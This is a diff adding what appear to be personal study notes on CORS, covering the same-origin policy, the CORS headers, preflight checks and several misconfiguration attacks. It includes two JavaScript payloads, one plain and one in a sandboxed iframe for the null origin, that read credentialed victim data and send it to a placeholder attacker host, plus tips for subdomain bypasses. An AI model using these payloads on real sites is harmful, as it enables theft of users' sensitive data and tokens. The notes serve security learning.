@@ -1,0 +1,228 @@
+g CORS
+
+Cross-origin resource sharing is a browser mechanism which enables controlled access to resources located outside of a given domain. 
+It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is 
+poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 
+
+The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access
+ is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access. 
+
+----SOP
+(SOP)The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.
+
+The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number. 
+For example, consider the following URL:
+http://normal-website.com/example/example.html
+
+This uses the scheme http, the domain normal-website.com, and the port number 80. The following table shows how the same-origin policy will be applied if content 
+at the above URL tries to access other origins:
+URL accessed 	Access permitted?
+http://normal-website.com/example/ 	Yes: same scheme, domain, and port
+http://normal-website.com/example2/ 	Yes: same scheme, domain, and port
+https://normal-website.com/example/ 	No: different scheme and port 
+
+---ACAO
+
+The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, 
+and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin 
+and permits access to the response if they match. 
+
+"This header is returned by a server when a website requests a cross-domain resource, with an Origin header added by the browser. "
+
+For EXAMPLE, suppose a website with origin normal-website.com causes the following cross-domain request:
+
+GET /data HTTP/1.1
+Host: robust-website.com
+Origin : https://normal-website.com
+
+The server on robust-website.com returns the following response:
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+
+The browser will allow code running on normal-website.com to access the response because the origins match.
+The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *.
+However, no browser supports multiple origins and there are restrictions on the use of the wildcard *. 
+
+------------------------------CORS with credentials(ACAO=true)
+Cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true. 
+Now if the requesting website uses JavaScript to declare that it is sending cookies with the request:
+
+GET /data HTTP/1.1
+Host: robust-website.com
+...
+Origin: https://normal-website.com
+Cookie: JSESSIONID=<value>
+
+And the response to the request is:
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+Access-Control-Allow-Credentials: true
+
+Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials 
+response header is set to true. Otherwise, the browser will not allow access to the response. 
+
+----------------------------------WILDCARD
+
+The header Access-Control-Allow-Origin supports wildcards. For example:
+
+Access-Control-Allow-Origin: *
+
+
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+Is not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone. 
+
+-----------------------------------Pre-flight checks
+
+When a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the 
+CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check.
+ The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.
+
+For example, this is a pre-flight request that is seeking to use the PUT method together with a custom request header called Special-Request-Header:
+
+OPTIONS /data HTTP/1.1
+Host: <some website>
+...
+Origin: https://normal-website.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Special-Request-Header
+
+The server might return a response like the following:
+
+HTTP/1.1 204 No Content
+...
+Access-Control-Allow-Origin: https://normal-website.com
+Access-Control-Allow-Methods: PUT, POST, OPTIONS
+Access-Control-Allow-Headers: Special-Request-Header
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 240
+
+This response sets out the allowed methods (PUT, POST and OPTIONS) and permitted request headers (Special-Request-Header).
+In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for 
+caching the pre-flight response for reuse.
+
+---------------------------------------Vulnerabilities arising from CORS configuration issues
+
+Some application allow access from any other domain, this is a vulnerable CORS:(payload)
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+   location='//malicious-website.com/log?key='+this.responseText;
+};
+
+Place this script in the attacker-site will expose useful information, like API or CSRF token.
+
+If you see some ACAO on the response, try to put 
+Origin: https://something.com
+And see if is reflected in the ACAO. In this case, CORS is misconfigurated and allow access from all domain.
+
+--------------------------------------------Errors parsing Origin headers(bypass with subdomain)
+
+Some implementation of CORS are based on a whitelist of domain that can be accessed.
+If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.
+There can be bad implementation that allow all subdomain of a domain(including future subdomains not yet in existence).
+These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
+
+For example, suppose an application grants access to all domains ending in:
+normal-website.com
+
+An attacker might be able to gain access by registering the domain:
+hackersnormal-website.com
+
+Alternatively, suppose an application grants access to all domains beginning with
+normal-website.com
+
+An attacker might be able to gain access using the domain:
+normal-website.com.evil-user.net
+
+So you can try to register a domain that can bypass CORS.
+
+--------------------------------------------Whitelisted NULL origin value
+
+The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
+
+    Cross-origin redirects.
+    Requests from serialized data.
+    Request using the file: protocol.
+    Sandboxed cross-origin requests.
+
+Some applications might whitelist the null origin to support local development of the application
+
+suppose an application receives the following cross-origin request:
+
+GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null
+
+And the server responds with:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header.
+This will satisfy the whitelist, leading to cross-domain access.
+
+PYALOAD WITH IFRAME:
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+------------------------------------------------------------------------XSS via CORS trust relationships 
+ Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
+
+Given the following request:
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://subdomain.vulnerable-website.com
+Cookie: sessionid=...
+
+If the server responds with:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+
+Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
+https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+----------------------------------------------------------------------------Breaking TLS
+
+Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: http://trusted-subdomain.vulnerable-website.com
+Cookie: sessionid=...
+
+The application responds with:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+
+The victim user makes any plain HTTP request.
+
+The attacker injects a redirection to:
+http://trusted-subdomain.vulnerable-website.com
+The victim's browser follows the redirect.
+
+The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
+https://vulnerable-website.com
+
+The victim's browser makes the CORS request, including the origin:
+http://trusted-subdomain.vulnerable-website.com
+The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
+The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
+
+
